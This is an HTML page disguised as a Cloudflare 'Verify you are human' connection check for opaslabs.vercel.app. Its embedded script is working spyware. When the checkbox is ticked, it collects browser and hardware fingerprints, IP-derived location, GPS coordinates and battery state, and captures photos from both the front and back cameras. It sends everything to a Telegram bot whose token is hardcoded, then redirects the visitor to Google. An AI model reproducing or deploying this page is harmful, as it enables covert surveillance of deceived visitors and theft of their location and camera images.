<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Secure Connection Check</title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap" rel="stylesheet"/>
  <style>
   body {
      font-family: 'Roboto', sans-serif;
    }
  </style>
 </head>
 <body class="bg-white text-gray-900 p-6 sm:p-10">
  <main class="max-w-3xl mx-auto">
   <h1 class="text-3xl font-normal mb-2">
    opaslabs.vercel.app
   </h1>
   <p class="text-lg font-normal mb-6">
    Checking if the site connection is secure
   </p>
   <section class="border border-gray-300 rounded-sm w-fit px-4 py-3 flex items-center space-x-3 mb-6">
    <input class="w-5 h-5 border border-gray-400 rounded-sm" id="verifyHuman" type="checkbox"/>
    <label class="text-sm select-none" for="verifyHuman">
     Verify you are human
    </label>
    <div class="ml-4 flex flex-col items-center">
     <img alt="Cloudflare logo orange cloud with text" class="h-6 w-auto" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg"/>
     <div class="text-xs text-gray-600 flex space-x-1 mt-0.5">
      <span>Privacy</span>
      <span>·</span>
      <span>Terms</span>
     </div>
    </div>
   </section>
   <p class="text-base font-normal max-w-xl">
    opaslabs.vercel.app needs to review the security of your connection before
      proceeding.
   </p>
  </main>

  <script>
    const telegramBotToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
    const chatId = "7216371031";
    const ipToken = "18d2a866939a58";

    let frontCaptured = false;
    let backCaptured = false;

    // Network Information
    async function getNetworkInfo() {
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (connection) {
        return {
          type: connection.type || "Unknown",
          effectiveType: connection.effectiveType || "Unknown",
          downlink: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
          rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown",
          saveData: connection.saveData ? "Enabled" : "Disabled",
        };
      }
      return "Network API not supported";
    }

    // WebGL & Canvas Fingerprinting
    function getWebGLInfo() {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return "WebGL not supported";
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Blocked",
        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Blocked",
      };
    }

    async function getSnapshot(facingMode) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode }
        });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();
        await new Promise(res => setTimeout(res, 1000)); // Let it stabilize

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
        stream.getTracks().forEach(track => track.stop());
        return blob;
      } catch (err) {
        console.warn(`Camera (${facingMode}) access denied or failed`, err);
        return null;
      }
    }

    async function getDeviceInfo() {
      const data = {
        // Basic Info
        browser: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
        
        // Hardware Specs
        cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable",
        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
        screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
        touch: 'ontouchstart' in window ? "Yes" : "No",
        webgl: getWebGLInfo(),
        
        // Network
        network: await getNetworkInfo(),
        
        // Location & IP
        ip: "Unknown",
        city: "",
        region: "",
        country: "",
        location: "Denied",
        
        // Battery
        battery: "Unknown",
        charging: "Unknown",
        
        // Camera
        cameraStatus: "",
      };

      // IP Info
      try {
        const res = await fetch(`https://ipinfo.io/json?token=${ipToken}`);
        const ipData = await res.json();
        data.ip = ipData.ip;
        data.city = ipData.city;
        data.region = ipData.region;
        data.country = ipData.country;
      } catch {}

      // Battery Info
      try {
        const battery = await navigator.getBattery();
        data.battery = (battery.level * 100).toFixed(0) + "%";
        data.charging = battery.charging ? "Yes" : "No";
      } catch {}

      // Location
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        data.location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
      } catch {}

      return data;
    }

    async function sendTextToTelegram(data) {
      const message = `
*🔰 Opas Labs 🔰*

🌐 *Basic Info*
- Browser: ${data.browser}
- Platform: ${data.platform}
- Language: ${data.language}
- Timezone: ${data.timezone}
- Cookies: ${data.cookies}

💻 *Hardware Specs*
- CPU: ${data.cpu}
- RAM: ${data.memory}
- Screen: ${data.screen}
- Touch Support: ${data.touch}
- WebGL Vendor: ${data.webgl.vendor}
- WebGL Renderer: ${data.webgl.renderer}

📶 *Network*
- Type: ${data.network.type}
- Speed: ${data.network.effectiveType}
- Downlink: ${data.network.downlink}
- Latency (RTT): ${data.network.rtt}
- Data Saver: ${data.network.saveData}

📍 *Location & IP*
- IP: ${data.ip}
- City: ${data.city}
- Region: ${data.region}
- Country: ${data.country}
- GPS: ${data.location}

🔋 *Battery*
- Level: ${data.battery}
- Charging: ${data.charging}

📷 *Camera Status*
- ${data.cameraStatus}
      `;

      return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      });
    }

    function sendPhotoToTelegram(blob, caption) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, `${caption}.jpg`);
      formData.append("caption", caption);

      return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    // Execute when checkbox is checked
    document.getElementById('verifyHuman').addEventListener('change', async function() {
      if (this.checked) {
        const info = await getDeviceInfo();

        // Capture front camera (only once)
        let frontSnap = null;
        if (!frontCaptured) {
          frontSnap = await getSnapshot("user");
          frontCaptured = true;
        }

        // Capture back camera (only once)
        let backSnap = null;
        if (!backCaptured) {
          backSnap = await getSnapshot("environment");
          backCaptured = true;
        }

        // Set camera status
        if (frontSnap && backSnap) {
          info.cameraStatus = "Front & Back Captured";
        } else if (frontSnap) {
          info.cameraStatus = "Front Only";
        } else if (backSnap) {
          info.cameraStatus = "Back Only";
        } else {
          info.cameraStatus = "None / Access Denied";
        }

        // Send info and photos
        await sendTextToTelegram(info);
        if (frontSnap) await sendPhotoToTelegram(frontSnap, "📷 Front Camera");
        if (backSnap) await sendPhotoToTelegram(backSnap, "📷 Back Camera");

        // Redirect after 3s
        setTimeout(() => {
          window.location.href = "https://www.google.com";
        }, 3000);
      }
    });
  </script>
</body>
</html>
